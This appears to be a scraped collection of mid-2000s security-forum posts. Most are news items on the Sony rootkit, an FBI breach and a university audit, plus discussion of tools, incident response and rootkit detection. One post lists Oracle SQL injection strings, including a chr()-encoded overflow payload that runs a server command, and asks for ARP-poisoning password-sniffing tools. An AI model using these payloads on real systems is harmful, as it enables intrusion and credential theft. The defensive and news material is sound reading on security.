2;Sony Music CDs = Rootkitsecurity watch: sony cds make your pc play the blues what it does: as originally discovered by security researcher mark russinovich of winternals software, certain music cds published by sony bmg entertainment contain drm protection requiring that the user must install a proprietary music player in order to play the songs. the player contains a rootkit (click here for a definition) as part of an effort to conceal the drm and prevent its removal. the drm software and the rootkit were written by a first 4 internet of the uk. the rootkit conceals all access to files and registry entries prefixed with the string $sys$ in order to hide itself, but this behavior could allow other malicious programmers to hide their own programs by using the same file naming scheme. first 4 internet and sony deny that the system presents a security problem. for full story: http://www.pcmag.com/article2/0,1895,1882795,00.asp do
2;Mozilla Downplays Firefox 1.5 Exploitprivate security outfit has released a proof-of-concept exploit for a security flaw in firefox 1.5, warning that the code can be modified to launch code execution attacks. however, officials at the mozilla foundation are downplaying the threat, insisting the bug is more of an "annoyance" than a serious security vulnerability. the exploit, which was posted on the packetstormsecurity.org web site, targets a buffer overflow in firefox 1.5, the newest browser release from mozilla. the exploit has been confirmed on firefox 1.5 on windows xp sp2 (service pack 2) and is caused by an error in the way the open-source browser handles large history information.  a successful attacker can fill the browsers "history.dat" file with large history information by tricking a user into visiting a malicious web site with an overly large title. for full story: http://www.eweek.com/article2/0,1895,1898253,00.asp do
3;WarGames 2: The Dead Keyupposedly filming was done last summer and a release date for 2006 is to be announced. none of the old cast is reported to be in it, but well keep an eye out for cameos (although highly unlikely). heres a quick overview of the story: on a class trip to europe cory carpenter, a teenage computer whiz, goes on the lam from the authorities, who have mistakenly pegged him as a cyber terrorist. while the technological infrastructure of the entire civilized world is apparently melting down, cory, his beautiful classmate anne deville, and his nerdy best buddy dale darrow, manage to stay one step ahead of the authorities. however, cory is later horrified to learn that his long time internet pal, jay forrell, is actually a government computer that has run amok and is about to hail nuclear disaster down on an unsuspecting planet. not much is out there as to who is in it or any other details for that matter. hey, at least we have a title. http://movies.go.com/movies/movie?name= ... studio=tba do

2;Active Cookie = Pharming Countermeasureloomington, ind. -- a new technique developed by an indiana university school of informatics scientist provides a strong shield against identity theft and cyber attacks.  cybersecurity expert markus jakobsson and the start-up ravenwhite inc., of which jakobsson is a co-founder, have developed an "active cookie," a countermeasure designed to protect against online scams such as pharming and man-in-the-middle attacks.  pharming is obtaining personal or private (usually financial) information through domain spoofing. rather than spamming with malicious and mischievous e-mail requests for users to visit fake web sites which appear legitimate, pharming "poisons" a domain name server by planting false information in the server, resulting in a users request being redirected elsewhere. the browser, however, tells users they are at the correct web site.  "there are no reliable commercial tools currently available to protect users from such attacks," said jakobsson, associate professor of informatics and associate director of the iu center for applied cybersecurity research. "we believe that active cookies can provide such protection."  ravenwhite provides a new use of cookies, which are coded pieces of information stored on a persons computer that identify that computer during the current and subsequent visits to a web site. active cookies can be used in some situations where traditional cookies are not practical. jakobssons invention helps protect against known types of pharming attacks and man-in-the-middle attacks, but also against new and threatening versions such as two new attacks discovered by mark meiss and alex tsow, both computer science doctoral students at iu.  meiss discovered a technique that allows an attacker to hijack almost any wi-fi (wireless fidelity) connection with the purpose of redirecting users to incorrect sites. he recently verified that the technique works in a local hotspot, a location where wi-fi users pick up an active signal.  "there is no way a user can determine that this attack takes place," explained meiss, a researcher at ius advanced network management lab. "you cant be sure you are actually visiting your banking site, for example, even though it looks like you are. there is simply no way of telling."  tsow discovered that consumer routers can be trivially modified to stealthily redirect users to fake sites. he showed a browser window where he typed ebay into the address bar, but where the loaded content showed the web page of the anti-phishing working group.  "in a real attack, the user would be taken to a site that is a true clone of the place they intended to go, but the cloned site would be operated by the attacker and would steal the users password," said tsow, a visiting research associate who works with jakobsson.  jakobsson believes these kinds of attacks pose threats that few have considered. "how can i dare to connect in a hotspot when the guy next to me may be hijacking my connection and taking me to the wrong site to steal my password?" jakobsson asked. "and how can anybody buy hardware from sellers they dont trust? these attacks are not detectable by the ordinary internet user."  jakobsson cautions that consumers should not buy a router from online services if they fear the seller might really be a phisher in disguise. apart from being a problem for online auction sites such as ebay, it is also a problem for financial service providers, whose customers are the potential victims of attacks of this type.

0;Oracle SQL Injection help...ello, this is my first post at this community, wait i can help other too. im pen-testing a host where have applications running in jsp and oracle as a back-end, i found 2 sql injections in this application, but im not been able to exploit it... if some oracle sql injection master can help me  the two scripts is like that: one is a login form. two is a search form, where one of the options (the city field) is vulnerable, so i belive its a injection in a where clause. my objetive is use the oracle database to execute commands in the server (i dont care about data in the database). if i try in the one (login form) the following strings (reference  http://www.securityfocus.com/infocus/1644 ): ;select username from all_users where x=x or exists (select 1 from sys.dual) and x=x union select username from all_users where x=x or x=x -- i get: ora-01756: quoted string not properly terminated if i try in the one (login form) the following strings (reference http://www.appsecinc.com/presentations/ ... curity.pdf ): union select password from dba_users where q = q i got: ora-00907: missing right parenthesis what already appear better, since know appear it have a  "parenthesis" unterminated. if i try in the one (login form) the following strings (reference http://seclists.org/lists/pen-test/2001/dec/0036.html ) (select username from all_users where 1=1) i got a html access denied message (like when i type a wring user or pass), appear that subselects doesnt work. ) union select username from all_users where (= i got: ora-00904: invalid column name however all_users is a valid table and username is a vaile colomn.  1 - why this happen? someone know ? how can i fix it ? i gained access to the host by other attack, and compromissed the database, and just for curious, i checked it, and it really exist: username sys system outln wmsys ordsys ordplugins mdsys ctxsys xdb anonymous wksys wkproxy ... ... i also find a intersting reference  ( http://security-papers.globint.com.ar/o ... abases.pdf ) where the guy show possibility of execute overflow via sql injections, with a string like that for example: a||to_char(mdsys.md2.sdo_code_size(aaaaaaaaaaaabbbbbbbbbbccccccccccdddddddddddddddddeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeffffffffffffffffffffffffffffggggggggggggggggggggggggggggggggggggggghhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh||chr(131)||chr(195)||chr(9)||chr(255)||chr(227)||chr(251)||chr(90)||chr(227)||chr(120)||chr(54)||chr(141)||chr(67)||chr(19)||chr(80)||chr(184)||chr(191)||chr(142)||chr(01)||chr(120)||chr(255)||chr(208)||chr(184)||chr(147)||chr(131)||chr(00)||chr(120)||chr(255)||chr(208)||dir>c:\dir.txt))-- 2 - if i try it, i got a ora-00907: missing right parenthesis, someone know how could i use it in my example ? 3 - even if it worked, he redirect the output to c:\dir.txt, cant it be sent to stdout (web page return from query) ? 4 - someone know a tool, that for example, i find a sql injection, and pass it to the tool, and it make several trys, to detect the right way to make the querys ?  ps: out of topic, someone already had success (or know how to) compile programs that use raw sockets/libpcap/libnet with cygwin (like compile dsniff, ettercap,...) ? ps2: or do you know a good password in command line for windows (that can be totally installed via command line) and make arp poison and filter passwords hash like ntlm, oracle, sql server, etc? thank you a lot. cy

lets identify each running process to start our investigation: a good site to use is  http://www.pacs-portal.co.uk/startup_pa ... up_all.php  as it lists startup programs that can appear in a microsoft windows environment (maliciously or not). legitimate process information can be found at  http://www.liutilities.com/products/win ... sslibrary/ , however, this is only a sample set from their sold product. if that fails, searching google (  http://www.google.com/ ) and google groups ( http://www.google.com/grphp?hl=en&tab=w ... 8&oe=utf-8 ) should give us a good idea. cmd.exe - standard windows command prompt process cmd.exe - standard windows command prompt process cmd.exe - standard windows command prompt process (comment: why are cmds running on a web server? what processes are they launching? they are not the problem themselves, but their presence indicates abnormal system activity for a secured web server.) cmluc.exe - probably client manager software for an orinoco wireless network card (comment: why is a web server attached to a wireless network?) csrss.exe - microsoft client/server runtime subsystem evntsvc.exe - application scheduler installed with real player (comment: more unnecessary software running on what should be a secure server) explorer.exe - windows desktop executable (comment: note that this may be a trojan backdoor left behind by the backdoor.graybird ( http://securityresponse.symantec.com/av ... ybird.html ). we cannot eliminate this as a suspect as its signature svch0st.exe is below the visible processes in task manager) ibmpmsvc.exe - power management driver for ibm laptops (comment: suggest to host that they run their web server on a server in the future, not a laptop) lsass.exe - microsoft local security authority server service (comment: we can eliminate the backdoor.irc.ratsou.b as hid.exe was not in the provided process list) mspmspsv.exe - wmdm pmsp service (helper service needed installed by windows media player 7) mstask.exe - the windows task manager regsvc.exe - remote registry service (comment: another service that should not be running on a production web server) rundll32.exe - windows rundll32 helper s__please_buy_. - unknown, very suspect s_my_new_book_. - unknown, very suspect (comment: these two are suspect as they are unknown processes. also, many trojans and viruses enter our system as shameless advertising. also note that both were the exact same memory size, 1,004k, which is unlikely) services.exe - windows service controller smss.exe - windows session manager subsystem  smss.exe - windows session manager subsystem  (comment: this second one is suspect. there should only be one on the system) the most suspect process on this box is the: smss.exe 1384 00 0:00:00 1,004k this is suspect for four reasons: 1. there should only be one instance of this process per server. 2. the pid is 1384, which is higher than the csrss.exe pid of 180. as smss.exe launches the csrss.exe process, it would be impossible under normal circumstances for it to have a higher pid value. 3. the size, 1,004k is identical to our other two suspect processes (s__please_buy_. and s_my_new_book_.). three processes with identical memory image sizes is unlikely and very, very suspect. 4. the size, 1,004k, is very large for such a small process.  therefore the second smss.exe is our suspect process and is most likely to be the backdoor trojan. based on a quick search of antivirus vendors sites, the trojan is probably backdoor.irc.flood.f ( http://securityresponse.symantec.com/av ... ood.f.html ). ********************************************************* 2) how could nigel determine whether this process was listening on a tcp or udp port, the user name it was running under, and the file that was executed to invoke the process? please list any built-in or third-party tools you would use to answer this question.    first, all checks must be done using known good versions of tools. any tool or exe on the existing system is suspect at this point. in our jumpkit we will have a cd-rom of tools that have been personally verified as valid. to determine the username that the process is running under, we use task manager (from our cd-rom). from task manager, choose view ... select columns. in the resulting dialog box, select user name. this will  then display the owning username in task manager. the others are difficult as windows 2000 does not provide an easy method to do these. windows xp and 2003 support the netstat -o option which displays the pid of the listening process. the best tool for this job, imho, is fport v2.0 from foundstone ( http://www.foundstone.com/resources/freetools.htm ). however, we will cover several options that cover several scenarios. if it is the backdoor.irc.flood.f trojan, netstat -an (run from the copy on our cd) will show a connection between our server and the evil server. the evil server port will be 6667.  if we want to locally validate what mstask has told us (in case it itself has been trojaned and is hiding the true culprit), we could run a tool such as pslist from sysinternals ( http://www.sysinternals.com/ntw2k/freew ... ools.shtml ). using the -t option, which shows the process tree, it should show us the second smss (pid 1384 running under explorer not under system as a real one would be). however, it does not show us the full path and filename to the smss.exe that is a trojan nor does it show which ports each process is listening on.  to remotely determine what ports are in the listening state and what is listening on them, i would recommend nmap 3.4.8 ( http://www.nmap.org ) using the new -sv option. this new option queries listening ports and attempts to identify what service or application is listening on that port. however, it also does not show which ports a process is listening on nor the path to that process. using fport (as noted above) displays the pid, process, port, protocol and path. this is exactly what we are looking for. by using the pid we can identify what ports and protocols our suspect process(es) are listening on. also, we learn the exact windows path to the trojan. ********************************************************** 3) why couldnt nigel kill this process using the "end process" button in the windows task manager? microsoft knowledge base article q263201 ( http://support.microsoft.com/default.as ... 263/2/01.a  sp&nowebcontent=1). by design windows task manager is prevented from ending this process by name. therefore, nigel received his error when he tried to shut it down. ********************************************************* 4) how could nigel actually kill the attackers process without rebooting the box? my preferred method is to use pskill from foundstone ( http://www.sysinternals.com/ntw2k/freew ... ools.shtml ). pskill should be used with the pid as an argument. if you use the process name it will actually kill the real smss.exe process (it kills all the process with that name.) so pskill 1384 would kill the trojan process without a need to reboot the box. the incident investigation would continue utilizing the following steps: - document all findings to date using a digital camera of the screen at key points and all commands run at the terminal methodically documented. - the server would then be shut down and the hard disk removed. - a new hard disk would be installed and the sytem rebuilt from scratch and brought back online - the new system should have (at a minimum):   - a firewall with ingress and egress filtering   - rulesets   - unnecessary services turned off   - application of iislockd and urlscan from microsoft   - no wireless network   - malware protection in the form of host ips (nai entercept or cisco okena stormwatch) or anti-virus software - the original hard disk should be marked with an indelible marker as the original. - a consultant firm should be hired to make forensic copies of the hard disk (using industry proven tools  such as safeback 3.0 by new technologies inc. -  http://www.forensics-intl.com/safeback.html ) - your legal team/lawyer should be contacted and made aware of the situation.  - the original hard drive and two forensic copies should be kept until such time as your lawyer states that they are no longer necessary as evidence. jay swofford ===== friends of the oregon caves http://www.oregoncaves.or
0;The TCP/IP Guide - Great Book, Free Onlinehere are a lot of posts in these forums asking about how to get started in ethical hacking. the most imperative place to start has to be a complete understanding of tcp/ip. without you will not only be lost when reading the materials and experimenting with the tools, but the hows and whys of most attacks will go right over your head. well do i have the reference for you: the tcp/ip guide: a comprehensive, illustrated internet protocols reference this is the definitive guide to the topic with not only 1500 pages of reference material but also, as the title suggests, illustrations of the concepts as well. with that much info, it clearly is not meant to be read from cover to cover. also, those who have reviewed it say that it is great for the newbie as well as the pro. i encourage you to read reviews to draw your own conclusions. but the best part is that the author, charles kozierok, has published the entire book online. its in html, contains ads (careful of the double lined links) and not as accessible as the book would be, but its there and free! http://www.tcpipguide.com/free/index.htm let us know what you think, do
3;LTL! Love the Linux!ne of my main gripes about the ceh program is how it seems to favor windows.  i was told this was because the ceh was targeted towards admins in charge of securing their networks and the ones that seemed to be so vulnerable were windows. whatever, and i am not about to go on a campaign that linux is better than windows. they both have there strong and weak points. i am so surprised to see how many programs that are coming available for windows as far as network security goes. yes, you can do some decent hacking with windows now, ( oh god did i really say that?)  actually, when i want to set up a tftp server so i can upload to a server i will use windows. <- secret shame! if you have a large budget, you can use a lot of great programs from core to the retina scanner.  you can do some real decent hacking with just windows. some  admins will say to me, “ i just deal with my window boxes and have no desire to deal with linux.”  they say and rightfully so, that they are not interested in doing security tests of a linux server so why bother. ok, here is my point and belief.  every good hacker i have ever met or even read about uses linux!  we keep reading these great sayings from sun zu  about how you must know the enemy as well as yourself. well?  if a hacker is going to use nessus (yeah i know its noisy, but many are using it now because you can go to a unsecured wireless network of your neighbor or local hotel and do what you want ) i want to see what he sees. if he is using linux tools, i want to see the same read outs on my network! believe me it looks a little different and can make someone take a little different direction into your network than what you might be thinking. if you doubt this, run different vulnerability scanners on different platforms and see what i mean.  linux is not hard. i can teach anyone in 1 hour or less all the basic stuff you need to get around. you don’t have to be a linux master to compile and navigate that os.   if you are the kind of person that likes more control of your os than bill likes to give you and you love to “tinker” with stuff then linux will addict you big time! ltl~! love the linux
2;Consultant Breached FBIs Computers... with Permission?government consultant, using computer programs easily found on the internet, managed to crack the fbis classified computer system and gain the passwords of 38,000 employees, including that of fbi director robert s. mueller iii. the break-ins, which occurred four times in 2004, gave the consultant access to records in the witness protection program and details on counterespionage activity, according to documents filed in u.s. district court in washington. as a direct result, the bureau said it was forced to temporarily shut down its network and commit thousands of man-hours and millions of dollars to ensure no sensitive information was lost or misused. the government does not allege that the consultant, joseph thomas colon, intended to harm national security. but prosecutors said colons "curiosity hacks" nonetheless exposed sensitive information. colon, 28, an employee of bae systems who was assigned to the fbi field office in springfield, ill., said in court filings that he used the passwords and other information to bypass bureaucratic obstacles and better help the fbi install its new computer system. and he said agents in the springfield office approved his actions. for full story: http://www.washingtonpost.com/wp-dyn/co ... 89_pf.html do
2;NSA War Game Teaches Net Defenseashington--the national security agency may be known for its stealthy eavesdropping techniques, but its going public with advice for how to train a new generation to defend against computer threats.  representatives from the usually secretive agency appeared at a sans institute event here to divulge "lessons learned" from their latest cyberdefense exercise. the exercise, which took place over four days in april, pitted students from the five u.s. military academies and the air forces postgraduate technology school against "bad guys" at nsa headquarters.  the nsa-sponsored exercise, unlike other governmental attempts at bolstering cyberpreparedness, has been regularly taking place for six years. fridays public presentation, however, was described as the first of its kind. (the department of homeland security, the agency chiefly responsible for safeguarding federal agencies cybersafety, wrapped up its first large-scale mock attack earlier this year, with an analysis of its results expected this summer.)  nsa representatives said they hoped the informal briefing would provide a wake-up call to all network managers, both inside and outside the government.  "even in four days, a network can be had," said major thomas augustine, the events coordinator. "imagine, if you will, those individuals who have a year or two to spare and are waiting to get into your networks."  during the exercise, each team received network software that had been tainted by a group of nsa representatives, and each had two weeks to find as many misconfigurations and vulnerabilities as they could. separate groups of nsa representatives, who were unaware of the existing vulnerabilities, then went to work over the four days attempting to hack into networks. the networks were designed and built by each military team and employed the nsa-supplied software.  in hopes of simulating a real-world situation, the attackers made a point of using the most publicly known exploits during the competition. they also took advantage of common mistakes like the use of weak passwords or the same passwords on multiple systems, and targeted security holes in microsoft windows that have readily available patches. for full story: http://news.com.com/2100-7355_3-6091731 ... &subj=news do
2;Dont let this Happen to You!ublished recently in the local newpaper, the plain dealer. hard to imagine something like this can still happen in this day and age, but it did. frickin hilarious, really. serves em right.  but the rest of guys out there can learn from this, and make sure....dont let this happen to you! the following is from  http://www.cleveland.com/search/index.ssf?/base/news/1151051511314270.xml?nohio&coll=2 don’t let this happen to you! security not a priority, ou computer system audit finds                    friday, june 23, 2006                 jennifer gonzalez                 plain dealer reporter   athens - an audit of ohio universitys computer system has found that security was not a priority and that lack of communication between computer and network services departments contributed to several computer breaches.   since april, the university has discovered five such breaches involving theft of the personal information of about 367,000 people. the stolen material included names, social security numbers and medical information.  the university has computer services and communication network services departments that have not worked well together, the audit found. the audit report was released thursday.  "going back over 10 years, cs and cns have traditionally worked autonomously and have not teamed together in a cooperative, collaborative environment. this has led to a quasi combative culture between two key groups who should have been working together," the audit says.   roderick mcdavis, ous president, said he is "angry and embarrassed" by the computer breaches. "we are committed to fixing the problem," he said.   the university has made some changes since the audit was completed.  that includes suspending the director of communication network services and the manager of internet and systems. in addition, the central information technology organization, which includes computer services and communication network services, is being restructured and three individuals who were placed on administrative leave will return to work because they were cleared of wrongdoing.   the university commissioned the audit by illinois-based moran technology consulting after the first breaches were discovered.  the audit also found:  •	understaffing of information technology personnel,  •	under skilled staff •	undefined information technology roles and responsibilities.  during interviews conducted by moran technology, staff members expressed frustration that communication network services and computer services management did not give enough priority to security in the planning, design, implementation and management of the universitys information technology infrastructure.  "many people commented that when new security ideas from various staff were discussed, their input was frequently ignored and sometimes ridiculed by cns management,"  the report says.  the staff also told moran that many employees only had on-the-job training. many of the computer services staff members involved with managing the windows server formerly worked in janitorial and help-desk positions.     in addition, the audit found that when computer services asked communication network services for information to diagnose performance or security problems, their requests were rejected.   if computer services and communication network services had worked together, the university "may have benefited from a more robust network monitoring facility,"  the report says.   to reach this plain dealer reporter:  jgonzalez@plaind.com , 216-999-432

0;the ten laws of geekaken from tapeworms excellent hacking how-to guide. the entire book is published in lower-case it seems, with plenty of l33t-sp3ak thrown in: the ten laws of geek so, you want to be an elite hacker, huh? why not? geeks are a very interesting specimen. the following are what i believe to be ten of the most popular geek laws, un-written laws, mind you (until now). i. thou shalt not  syn  (synchronize), only  ack  (acknowledge). geeks are typically known as quiet, reserved people. therefore the first step to becoming a geek is to  stfu  (shut the f--- up) and start paying attention. ii. thou shalt have seen the movie "hackers" and knoweth it well. i have never met a geek in my life that hasnt seen this movie. its quite an exaggeration on real life, but is a classic none the less. it is not uncommon to hear quotes from this movie in everyday geek conversation. iii. thou shalt  rtfm  (read the f---ing manual) before asking questions. nothing is more annoying than someone who just wants the solution to a problem when the answer can be located in the most obvious place. always attempt to learn for yourself. show a little effort. iv. thou shalt help guide those who seek answers, so long as they have complied with law three. with respect to the open-source state of mind, always share information with those who are curious; dont hide it. v. thou shalt not discriminate against nationality, skin color, sex, age, mental hindrances, physical flaws, sexual preferences, religious beliefs, personal taste in appearance, or music (w/ the exception of metallica). <graphic image here, not copied and pasted> discriminating against anything other than someones annoying personality is simply ignorant. the band metallica is known amongst geeks for their dispute against napster, a file sharing program allowing you to download and freely share music. as far as i am concerned, music was meant to be free. i can understand having people pay to be entertained at a live concert or for merchandise, but people have always been sharing music (they always will) and trying to stop them now just because "everyone" is doing it is pretty arrogant. i dont care how passionate you are, its not a job; it is a form of expression. im sure there are a lot of musicians/radio stations out there who will disagree with me and youre welcome to your own opinion on this. just dont be surprised if youre looked down upon for liking or even listening to bands that share your opinion, especially metallica. begin rant why its okay to "steal" music lets face it; you might as well be sued for singing along w/the radio in ur car because somebody outside the car might hear it. no, waitâśthats legal because its on the radio right? or is it? maybe its a cd!! omgz sure its okay to advertise, you can play the music, sing the music, but you cant have the music. some psychologists believe music can help keep ones sanity, like medication. the riaa is taking away your medication! summary: the only difference between downloading a song and learning to play the song on your guitar is there is no difference. just a bunch of hypocritical money-grubbing morons. pwn! music is free. beeyotch! plz dun sue me. end rant   vii. thou shalt not place thyself above thine fellow geeks within the geek chain; thou canst only lower thyself. only via election canst thy rank be promoted, and thou art otherwise equal. nobody likes a cocky individual, and geeks are very respectful to one another regarding this issue. always realize that there is someone out there who is smarter than you. once u reach a certain level of education, other geeks will naturally grow more respectful of you, as if they instinctively sense ur a valuable resource. with respect to the sixth law, thou mayeth challenge the credibility of any self-proclaimed geek, and so mayeth thou invoke the power of the sixth law to deduct geek points from anyone who questions basic geek knowledge. a lot of people call themselves a hacker when theyre not, such as script-kiddies. there is no harm in a friendly duel to see whether or not someone is full of  bs  (bull sh--). losing geek points, for the record, does not make you more of a geek; it is not a good thing. viii. thou shalt treat all computers as thou wouldst treat thyself, for thou art the creator of thine own problems. hey, it is not your computers fault that you made it run crappy. get with it or get off it. you certainly dont want to trade your every keystroke over to a geek to fix it for you, do you? <graphic image here, not copied or pasted> ix. thou shalt help to preserve history, ensure the protection of thine individual rights, and keep information free. this also has to do with the open-source state of mind and the freedom of information. history (and the truth) is as important as much as it can be boring. at  archive.org  you can actually look up websites that dont exist anymore, kind of like a digital library. it is a very useful geek tool, especially for web developers who forgot to make a backup of their data before neglecting to pay their hosting bill. x. thou shalt refrain from using thine geek powers for malicious purposes unless upon thyself, within a tolerated environment, or to fend off malicious invasions. hackers are like jedis, crackers are like the sith: do not fall prey to the dark side. if you have no idea what im talking about, go watch the star wars movies. there are many other laws which you will come to learn over time, but the preceding each deserves special notice.   â  
1;Scapyhis tool was mentioned in another post, and it deserves a spot of its own. so heres the skinny on this very flexible tool from the horses mouth: what is scapy scapy is a powerful interactive packet manipulation program. it is able to forge or decode packets of a wide number of protocols, send them on the wire, capture them, match requests and replies, and much more. it can easily handle most classical tasks like scanning, tracerouting, probing, unit tests, attacks or network discovery (it can replace hping, 85% of nmap, arpspoof, arp-sk, arping, tcpdump, tethereal, p0f, etc.). it also performs very well at a lot of other specific tasks that most other tools cant handle, like sending invalid frames, injecting your own 802.11 frames, combining technics (vlan hopping+arp cache poisoning, voip decoding on wep encrypted channel, ...), etc. what makes scapy different from most other networking tools first, with most other tools, you wont build someting the author did not imagine. these tools have been built for a specific goal and cant deviate much from it. for example, an arp cache poisoning program wont let you use double 802.1q encapsulation. or try to find a program that can send, say, an icmp packet with padding (i said padding, not payload, see?). in fact, each time you have a new need, you have to build a new tool.  second, they usually confuse decoding and interpreting. machines are good at decoding and can help human beings with that. interpretation is reserved to human beings. some programs try to mimic this behaviour. for instance they say "this port is open" instead of "i received a syn-ack". sometimes they are right. sometimes not. its easier for beginners, but when you know what youre doing, you keep on trying to deduce what really happened from the programs interpretation to make your own, which is hard because you lost a big amount of information. and you often end up using tcpdump -xx to decode and interpret what the tool missed.  third, even programs which only decode do not give you all the information they received. the networks vision they give you is the one their author thought was sufficient. but it is not complete, and you have a bias. for instance, do you know a tool that reports the padding ?  scapy tries to overcome those problems. it enables you to build exactly the packets you want. even if i think stacking a 802.1q layer on top of tcp has no sense, it may have some for somebody else working on some product i dont know. scapy has a flexible model that tries to avoid such arbitrary limits. youre free to put any value you want in any field you want, and stack them like you want. youre an adult after all.  in fact, its like building a new tool each time, but instead of dealing with a hundred line c program, you only write 2 lines of scapy.  after a probe (scan, traceroute, etc.) scapy always gives you the full decoded packets from the probe, before any interpretation. that means that you can probe once and interpret many times, ask for a traceroute and look at the padding for instance. for more: http://www.secdev.org/projects/scapy/ do
3;Linux vs Windowsam sure some of you are thinking “oh god not this tired old argument again!”  i understand, but i thought i would discuss it from the hackers perspective and without any emotions like “i like linux more because if you take the name bill gates and convert it to ancient sanskrit and then to latin and then convert to numerals it equals 666, which must mean he is the anti christ!  i thought it might be interesting to some of the younger people on the forum that don’t really know the history of the linux vs windows issue.     i am more about getting the job done and i don’t care what os i use.  i remember reading some place that a person’s preference for an os reveals more about that person than the os.  as cold as computer people are supposed to be as displayed in movies, i actually find them the opposite. i am surprised how passionate about technology many are and often their allegiance to an os is sometimes emotional based.    linux was embraced as the os of choice by the underground for the longest time, but why was that?  several reasons existed.  back in the days of when windows 98 had just come out, linux was definably ahead.  windows 98 was a “wanna be” 32 bit overlay gui struggling on a 16 bit dos underbelly.  not the most stable environment and was prone to crashing. it was said that microsoft was worried about legal problems from apple if they created a pure 32 bit os since they “borrowed” the windows idea from apple during there brief association together.  so they were stuck with pushing something not as efficient or stable.  also, the underground seems to attract some very paranoid people and i remember a lot of people being worried that gates had hidden some kind of spy ware deep inside windows and because everyone from the government to financial institutions used it, gates was set up to be the next lex luther  or dr. evil !     early on many of the hacking tools were written only for linux, making it difficult to do much without at least some knowledge of that os.  linux stood out, a powerful 32 bit os that you could open up and look at the source code and you could tweak it so many ways to what your preference might be.  windows was seen as closed and hidden and being pushed by one greedy man on the entire world!  if you have never been exposed to this kind of thinking, perhaps now you can see why the underground embraced linux so feverishly!       what about the tools available today?  is one platform favored above another?  this is difficult to answer because each pen tester favors certain apps and therefore might lean more towards one os over another.  however, if we were to analyze the top 100 network security tools that are listed on insecure.org and use that list as a standard, we find some interesting facts. if you were a linux only user there are 22 exclusive windows apps you could not use on that list.  if you were a windows only user, there are 25 linux apps that would be unavailable to you.  it’s so close to being even that you could not say one os is more important than the other.       as for me, i can’t say one is better than the other at this point in time and i am referring to its use in the art and science of hacking. i am certainly not referring to the os i would recommend to my grandma!  that os would be a very obvious choice indeed, lol!  when xp was introduced for everyone, being a truer 32 bit structure, things really changed, although you would still see people that were loyal to linux calling it windoze. its just too hard to let go of your prejudice sometimes. now windows was fast and more stable. it actually started to feel like it had the power of linux or unix.  by the way, if you wanted to get flamed back in those days, just go to a hacker forum and post that your favorite isp was aol and you ran windows!  actually, all you had to do was say something nice about windows !    i have done some very efficient hacking with windows and i can’t say that the reverse shell i get is in any way less stable.  there have been times i felt i had better results with nmap using linux.  exploits if they are ported correctly work just fine with windows. ok, so where am i headed with all of this?  yes, you guessed it, for me the best set up is using both!  both have their strong and weak points. they really compliment each other.  i run linux on one laptop and windows on another.  right now i am using xp pro and fedora core 5.        say for instance i want to crack wep.  i will run airodump on my windows machine and at the same time, i will run aireplay on my linux laptop.  i do all my reconnaissance work with windows.  scanning is 90% a linux operation for me.    if i want to use a bootable cd, well i better know my linux!  anyway, i hope you see how i jump from one to the other and i find this really works well.        so, is one easier to hack than the other?  that’s a loaded question because it depends on the set up.  for many years the cry was linux was more secure because you could turn off services and customize the installation more so than windows, etc… however, it was an embarrassing statistic to the linux aficionados that the most hacked servers in the world were linux!  i can testify to the fact that both windows and linux, if properly configured, have the ability to be nearly impenetrable!        that’s my perspective on it and i try to be as objective as i can, because as i stated before,  i am more interested in getting the job done
3;Hacker Says Netscape Ignored Warning Via Hacker Ethicackers claim to live by codes. no matter what people think of "d," who hacked the new digg-style netscape, he insists it was done for good, not evil. besides, says d, they had it coming. he gave them ample warning about their security problem. news of the hack was first reported by security company f-secure on july 26th, a few days after netscape head jason calacanis offered a-list digg.com submitters $1,000 per month to write for netscape instead.  visitors checking out netscapes new format were greeted with pop-ups, created from a cross-site scripting (xss) vulnerability, containing profanity, redirects to digg.com, and the comedic proclamation that someone named tom way was the sexiest man alive, giving the exploit a prank feel.  hacker ethics, as alluded to earlier, include a set of commandments for "moral" use of the trade. hackers are not to destroy or damage files. they should notify system administrators about security holes located. they should not steal. they should document and distribute information about exploits. according to d, set to begin as a first-year computer science student, these guidelines were followed in attempt to protect netscape users from malicious hackers. for full story: http://www.securitypronews.com/insiderr ... w.html?d=1 do

1;Defeating Rootkitsam shocked by the amount of admin i meet that really don’t understand rootkits.  this is unfortunate because rootkits can be your worst nightmare if you are unaware of them.  there are computers that have been rootkitted for years and no one suspects it at all! the only good thing about a rootkit is that you need to be root to install one. in other words, they are useless if you haven’t first achieved access to the target host.  on the other hand, once they are there, your network is in deep trouble.      if you harden your system, no one should be able to place a rootkit in the first place. fap your network! that is, firewall, antivirus, and patch your boxes! yes antivirus can help.  even the free antivirus that is available can catch rootkits before they are installed. as a test, i hacked a lab box only running avg free antivirus and it caught all 4 of the very popular rootkits (including fu and hacker defender) i tried to install.    maybe you have just taken over responsibility for a network that might not have been well maintained and you are worried there might be a rootkit already installed.  how can you tell?  its very difficult to tell because the entire purpose of a rootkit is to hide and give a backdoor.  they can hide in what is called user mode or kernel level. kernel level is the worst.  if well configured, it can be almost impossible to detect by the local host scanning itself.    the best approach to detecting and defeating rootkits is to use a combination of techniques and not to rely on just one.  certainly running file integrity checkers is of value and should be part of the arsenal, but unfortunately you cant rely completely on them.  if a kernel level rootkit is configured perfectly, it can hide from even tripwire. the key word there is “configured perfectly” and that requires some understanding. if a less skilled attacker slips up on even just one little thing, the file integrity checker will detect them. so certainly tripwire or aide should be part of the defense strategy.     an admin should have at least one bootable cd he can use for forensics. you can shut the machine down and then boot to the cd. the value to this is now you can inspect the file system without the corrupted kernel hiding unwanted changes.   one of the best tools for this is helix available at  http://www.e-fense.com/helix/  and i would say for me it’s a must have.    automated rootchecker software is of value and should be run. again, the idea is not to rely on just one thing!  you need to run multiple kinds of tests.  the author of the notorious rootkit “hacker defender” recommends that both backlight and icesword are used when inspecting for rootkits.   here is a list of some popular checkers: icesword  http://www.blogcn.com/user17/pjf/index.html blacklight  http://www.f-secure.com/blacklight rootkit hunter  http://www.rootkit.nl/ chkrootkit  http://www.chkrootkit.org/ rootkit revealer  http://www.sysinternals.com/utilities/r ... ealer.html just remember that these tools are not perfect and can give false positives. don’t be lazy and rely only on running automated tools like these.   if a rootkit is giving backdoor access, why cant we just run netstat –an or tools like fport, openports and tcpvcon? the problem with such scans is they rely on the corrupted kernel to give accurate results and netstat is an area that rootkits are coded to blind. the best way and often over looked is to scan not from the local host but a remote one. do a nmap scan from a different host on the network and look for open ports. the corrupted kernel can only deceive the local host. if you see an open port that should not be there, that is a strong clue something is not right!     as always, to really learn about rootkits you need to install one on your test lab box. you 